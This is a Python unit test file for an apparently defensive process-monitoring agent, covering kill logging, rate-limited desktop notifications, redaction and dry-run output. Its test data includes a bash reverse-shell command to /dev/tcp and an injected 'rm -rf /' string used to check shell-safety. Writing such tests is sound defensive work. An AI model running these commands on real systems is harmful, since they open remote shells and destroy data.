#!/usr/bin/env python3
"""Kill reporting: log line, desktop notification, honest dry-run output.

Run: python3 tests/test_kill_reporting.py
"""
import io, json, os, subprocess, sys, tempfile, types, unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parent.parent
_bcc = types.ModuleType("bcc"); _bcc.BPF = object
_u = types.ModuleType("bcc.utils"); _u.printb = lambda *a, **k: None
sys.modules.setdefault("bcc", _bcc); sys.modules.setdefault("bcc.utils", _u)
sys.path.insert(0, str(REPO / "agent"))
os.environ.setdefault("SENTINEL_CONFIG", str(REPO / "config" / "rules.yaml"))
import sentinel_lineage_agent as A  # noqa: E402


def entry(cmd="bash -i >& /dev/tcp/1.2.3.4/9 0>&1", pid=4242):
    return A.LineageEntry(lineage_id=0x77, parent_lineage_id=0, pid=pid, ppid=1, uid=1000,
        gid=1000, ns_pid=pid, comm="bash", binary_path="/usr/bin/bash", cmdline=cmd,
        exec_timestamp=0.0, flags=0)


RULE = A.Rule(id=1002, name="Reverse Shell", pattern="x")


class TestReportKill(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.NamedTemporaryFile("w+", suffix=".log", delete=False)
        self.tmp.close()
        self._p = mock.patch.multiple(A, KILL_LOG=self.tmp.name, NOTIFY_ENABLED=True,
                                      _notify_last=0.0, _NOTIFY_MIN_GAP=3.0)
        self._p.start()

    def tearDown(self):
        self._p.stop(); os.unlink(self.tmp.name)

    def test_writes_json_line_with_redacted_cmdline(self):
        with mock.patch.object(A, "_desktop_notify", return_value=0):
            A.report_kill(4242, entry("curl --password=hunter2 http://x"), RULE, 2, 1)
        rec = json.loads(Path(self.tmp.name).read_text().splitlines()[0])
        self.assertEqual(rec["rule_id"], 1002)
        self.assertEqual(rec["killed"], 2)
        self.assertNotIn("hunter2", rec["cmdline"])

    def test_notification_is_rate_limited(self):
        calls = []
        with mock.patch.object(A, "_desktop_notify", side_effect=lambda t, b: calls.append(b)):
            A.report_kill(1, entry(), RULE, 1, 0)
            A.report_kill(2, entry(), RULE, 1, 0)
            for t in __import__("threading").enumerate():
                if t is not __import__("threading").current_thread():
                    t.join(timeout=1)
        self.assertEqual(len(calls), 1)
        self.assertEqual(len(Path(self.tmp.name).read_text().splitlines()), 2)

    def test_notify_disabled_still_logs(self):
        with mock.patch.object(A, "NOTIFY_ENABLED", False), \
             mock.patch.object(A, "_desktop_notify") as dn:
            A.report_kill(1, entry(), RULE, 1, 0)
        dn.assert_not_called()
        self.assertEqual(len(Path(self.tmp.name).read_text().splitlines()), 1)

    def test_markup_is_escaped(self):
        self.assertEqual(A._notify_escape("<b>&x</b>"), "&lt;b&gt;&amp;x&lt;/b&gt;")


class TestDesktopNotify(unittest.TestCase):
    def test_runs_as_the_user_with_their_bus_and_no_shell(self):
        with mock.patch("shutil.which", return_value="/usr/bin/notify-send"), \
             mock.patch.object(A, "_desktop_sessions", return_value=[(1000, 1000, "/home/u", "/run/user/1000/bus")]), \
             mock.patch("subprocess.run", return_value=types.SimpleNamespace(returncode=0)) as run:
            n = A._desktop_notify("t", "b; rm -rf /")
        self.assertEqual(n, 1)
        args, kw = run.call_args
        self.assertEqual(kw["user"], 1000)
        self.assertEqual(kw["env"]["DBUS_SESSION_BUS_ADDRESS"], "unix:path=/run/user/1000/bus")
        self.assertIs(type(args[0]), list)
        self.assertEqual(args[0][-2:], ["t", "b; rm -rf /"])   # data, never a shell string
        self.assertIn("--", args[0])

    def test_no_notify_send_is_a_quiet_noop(self):
        with mock.patch("shutil.which", return_value=None):
            self.assertEqual(A._desktop_notify("t", "b"), 0)

    def test_failing_session_does_not_raise(self):
        with mock.patch("shutil.which", return_value="/usr/bin/notify-send"), \
             mock.patch.object(A, "_desktop_sessions", return_value=[(1000, 1000, "/h", "/run/user/1000/bus")]), \
             mock.patch("subprocess.run", side_effect=subprocess.TimeoutExpired("x", 3)):
            self.assertEqual(A._desktop_notify("t", "b"), 0)


class TestKillProcessOutput(unittest.TestCase):
    def setUp(self):
        A.lineage_tree.clear()

    def run_kill(self, dry, killed_ok=True):
        e = entry()
        A.lineage_tree[e.pid] = e
        out = io.StringIO()
        with mock.patch.object(A, "DRY_RUN", dry), \
             mock.patch.object(A, "_kill_if_same_process", return_value=killed_ok), \
             mock.patch.object(A, "block_lineage"), \
             mock.patch.object(A, "report_kill") as rep, redirect_stdout(out):
            A.kill_process(e.pid, e, RULE)
        return out.getvalue(), rep

    def test_real_kill_is_reported(self):
        out, rep = self.run_kill(dry=False)
        self.assertIn("KILLED lineage", out); self.assertIn("rule 1002", out)
        rep.assert_called_once()

    def test_dry_run_says_would_kill_and_does_not_report(self):
        out, rep = self.run_kill(dry=True, killed_ok=False)
        self.assertIn("WOULD KILL", out); self.assertNotIn("KILLED lineage", out)
        rep.assert_not_called()

    def test_already_gone_is_not_called_a_kill(self):
        out, rep = self.run_kill(dry=False, killed_ok=False)
        self.assertIn("NOT KILLED", out)
        rep.assert_not_called()


if __name__ == "__main__":
    unittest.main(verbosity=1)
